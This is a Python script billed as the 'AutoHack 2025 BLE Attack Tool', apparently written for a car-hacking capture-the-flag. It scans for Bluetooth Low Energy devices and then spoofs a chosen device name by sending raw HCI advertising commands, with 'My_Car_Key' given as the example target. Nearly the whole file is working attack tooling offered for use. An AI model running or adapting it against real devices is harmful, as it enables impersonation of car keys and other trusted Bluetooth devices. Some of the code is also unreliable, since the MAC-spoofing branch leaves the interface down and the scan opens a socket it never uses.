#!/usr/bin/env python3
import sys
import os
import time
import argparse
import subprocess
from scapy.all import *
from scapy.layers.bluetooth import *

# --- Configuration ---
INTERFACE = "hci0"

# --- Colors for Output ---
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] This script requires ROOT privileges. Run with sudo.{Colors.END}")
        sys.exit(1)

def run_command(cmd):
    """Run Linux system command and return output"""
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode().strip()
    except subprocess.CalledProcessError as e:
        return None

def reset_interface():
    """Reset Bluetooth Interface"""
    print(f"{Colors.YELLOW}[*] Resetting {INTERFACE}...{Colors.END}")
    run_command(f"hciconfig {INTERFACE} down")
    run_command(f"hciconfig {INTERFACE} up")
    run_command(f"hciconfig {INTERFACE} noleadv") # Stop advertising if running
    time.sleep(1)

# --- 1. Scanning Module (Scapy Based) ---
def scan_ble(timeout=10):
    print(f"{Colors.BLUE}[*] Scanning for BLE devices ({timeout}s)...{Colors.END}")
    print(f"{Colors.BOLD}{'MAC Address':<20} | {'RSSI':<5} | {'Name'}{Colors.END}")
    print("-" * 50)
    
    devices = set()

    def packet_handler(pkt):
        if pkt.haslayer(BLEAdvertisement):
            addr = pkt[BLEAdvertisement].addr
            rssi = pkt.rssi if hasattr(pkt, 'rssi') else "N/A"
            name = "Unknown"

            # Try to parse Local Name
            if pkt.haslayer(EIR_CompleteLocalName):
                try:
                    name = pkt[EIR_CompleteLocalName].local_name.decode('utf-8')
                except:
                    name = str(pkt[EIR_CompleteLocalName].local_name)
            elif pkt.haslayer(EIR_ShortenedLocalName):
                try:
                    name = pkt[EIR_ShortenedLocalName].local_name.decode('utf-8')
                except:
                    name = str(pkt[EIR_ShortenedLocalName].local_name)
            
            unique_id = f"{addr}_{name}"
            if unique_id not in devices:
                devices.add(unique_id)
                color = Colors.GREEN if name != "Unknown" else Colors.END
                print(f"{color}{addr:<20} | {rssi:<5} | {name}{Colors.END}")

    try:
        # Scapy's Bluetooth socket
        bt = BluetoothHCISocket(0)
        sniff(store=0, prn=packet_handler, timeout=timeout, lfilter=lambda x: x.haslayer(BLEAdvertisement))
    except Exception as e:
        print(f"{Colors.RED}[!] Scan Error: {e}{Colors.END}")
        print(f"{Colors.YELLOW}[Tip] Try 'sudo hciconfig hci0 up' or check your bluetooth adapter.{Colors.END}")

# --- 2. Spoofing Module (HCI Command Based) ---
def spoof_ble(target_name, target_mac=None):
    """
    Spoofing with HCI commands is more stable than Scapy for transmission.
    Constructs raw HCI commands to set Advertising Data.
    """
    reset_interface()
    
    print(f"{Colors.RED}[*] Starting BLE Masquerade Attack...{Colors.END}")
    
    # 1. Change MAC Address (If supported by hardware)
    if target_mac:
        print(f"{Colors.YELLOW}[*] Attempting to spoof MAC to: {target_mac}{Colors.END}")
        # Try bdaddr (needs bluez-tools or similar, often fails on internal chips)
        # Fallback to standard hci command for random address if specific spoof fails
        # Here we warn because internal RPi chip MAC spoofing is tricky without specific tools like bdaddr
        print(f"    (Note: MAC spoofing depends on HW support. If it fails, only Name will be spoofed.)")
        # Try standard linux command (often blocked)
        run_command(f"hciconfig {INTERFACE} down")
        # This is a specific command for CSR dongles, might not work on Broadcom (RPi)
        # We proceed with Name Spoofing which is the main 'Masquerade' in CTF.

    # 2. Construct Advertising Data Payload (Length, Type, Value)
    # Flag: 0x02, 0x01, 0x06 (General Discoverable, BR/EDR Not Supported)
    # Name: Length, 0x09 (Complete Local Name), Name_Bytes
    
    name_bytes = target_name.encode('utf-8')
    name_len = len(name_bytes) + 1 # +1 for type byte (0x09)
    
    # Max BLE payload is 31 bytes. Check length.
    if name_len + 3 > 31:
        print(f"{Colors.RED}[!] Name too long! Truncating...{Colors.END}")
        name_bytes = name_bytes[:26]
        name_len = len(name_bytes) + 1

    # Build HCI Command for "Set Advertising Data" (OGF=0x08, OCF=0x0008)
    # Payload structure: [Len] [Data.......]
    # Data: [02 01 06] [Name_Len 09 'N' 'a' 'm' 'e'] [00 00 ...]
    
    cmd_payload = "02 01 06 {:02x} 09 ".format(name_len)
    for b in name_bytes:
        cmd_payload += "{:02x} ".format(b)
    
    # Pad with zeros up to 31 bytes
    current_len = 3 + 1 + name_len
    padding = "00 " * (31 - current_len)
    
    full_cmd = f"hcitool -i {INTERFACE} cmd 0x08 0x0008 {len(cmd_payload.split()) + len(padding.split()):02x} {cmd_payload}{padding}"
    
    print(f"{Colors.GREEN}[+] Setting Advertising Data: {target_name}{Colors.END}")
    # print(f"    Cmd: {full_cmd}") # Debug
    run_command(full_cmd)

    # 3. Enable Advertising (OGF=0x08, OCF=0x000A)
    print(f"{Colors.GREEN}[+] Enabling Advertising...{Colors.END}")
    run_command(f"hcitool -i {INTERFACE} cmd 0x08 0x000a 01")

    print(f"\n{Colors.RED}[!!!] BEACON ACTIVE. We are now masquerading as '{target_name}' [!!!]{Colors.END}")
    print(f"{Colors.YELLOW}    Press Ctrl+C to stop.{Colors.END}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.BLUE}[*] Stopping Attack...{Colors.END}")
        run_command(f"hciconfig {INTERFACE} noleadv")
        print("[+] Done.")

# --- Main Entry ---
if __name__ == "__main__":
    check_root()

    parser = argparse.ArgumentParser(description="AutoHack 2025 BLE Attack Tool")
    subparsers = parser.add_subparsers(dest="mode", help="Mode of operation")

    # Scan Mode
    scan_parser = subparsers.add_parser("scan", help="Scan for BLE devices")
    scan_parser.add_argument("-t", "--timeout", type=int, default=10, help="Scan duration (seconds)")

    # Spoof Mode
    spoof_parser = subparsers.add_parser("spoof", help="Masquerade as a device")
    spoof_parser.add_argument("-n", "--name", required=True, help="Target Device Name to spoof (e.g., 'My_Car_Key')")
    spoof_parser.add_argument("-m", "--mac", help="Target MAC Address (Hardware dependent, optional)")

    args = parser.parse_args()

    if args.mode == "scan":
        scan_ble(args.timeout)
    elif args.mode == "spoof":
        spoof_ble(args.name, args.mac)
    else:
        parser.print_help()
